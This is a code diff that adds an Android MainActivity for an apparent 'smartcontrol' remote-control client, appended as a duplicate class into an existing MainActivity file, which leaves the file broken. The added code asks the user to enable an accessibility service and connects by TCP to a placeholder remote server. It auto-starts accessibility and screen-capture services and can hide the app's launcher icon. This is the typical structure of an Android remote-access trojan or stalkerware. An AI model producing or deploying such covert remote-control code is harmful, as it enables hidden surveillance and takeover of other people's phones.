@@ -443,3 +443,88 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 }
+package com.smartcontrol.client;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.widget.Toast;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class MainActivity extends AppCompatActivity {
+    public static final String DEFAULT_SERVER_HOST = "YOUR_REPLIT_URL.replit.dev";
+    public static final int DEFAULT_SERVER_PORT = 8081;
+    
+    private TCPClient tcpClient;
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        // Check and request accessibility permission
+        if (!isAccessibilityServiceEnabled()) {
+            requestAccessibilityPermission();
+        }
+        
+        // Initialize TCP client
+        String serverIP = getString(R.string.server_ip);
+        int serverPort = Integer.parseInt(getString(R.string.server_port));
+        
+        tcpClient = new TCPClient(serverIP.isEmpty() ? DEFAULT_SERVER_HOST : serverIP, 
+                                  serverPort == 0 ? DEFAULT_SERVER_PORT : serverPort);
+        tcpClient.connect();
+        
+        // Auto-start if enabled
+        boolean autoStart = Boolean.parseBoolean(getString(R.string.auto_start));
+        if (autoStart) {
+            startServices();
+        }
+        
+        // Hide icon if enabled
+        boolean hideIcon = Boolean.parseBoolean(getString(R.string.hide_icon));
+        if (hideIcon) {
+            hideAppIcon();
+        }
+    }
+    
+    private boolean isAccessibilityServiceEnabled() {
+        String service = getPackageName() + "/" + AccessibilityService.class.getName();
+        String enabledServices = Settings.Secure.getString(getContentResolver(),
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+        return enabledServices != null && enabledServices.contains(service);
+    }
+    
+    private void requestAccessibilityPermission() {
+        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+        startActivity(intent);
+        Toast.makeText(this, "Please enable accessibility service for remote control", 
+                      Toast.LENGTH_LONG).show();
+    }
+    
+    private void startServices() {
+        // Start accessibility service
+        Intent serviceIntent = new Intent(this, AccessibilityService.class);
+        startService(serviceIntent);
+        
+        // Start screen capture service
+        Intent captureIntent = new Intent(this, ScreenCaptureService.class);
+        startService(captureIntent);
+    }
+    
+    private void hideAppIcon() {
+        getPackageManager().setComponentEnabledSetting(
+                getComponentName(),
+                getPackageManager().COMPONENT_ENABLED_STATE_DISABLED,
+                getPackageManager().DONT_KILL_APP);
+    }
+    
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        if (tcpClient != null) {
+            tcpClient.disconnect();
+        }
+    }
+}
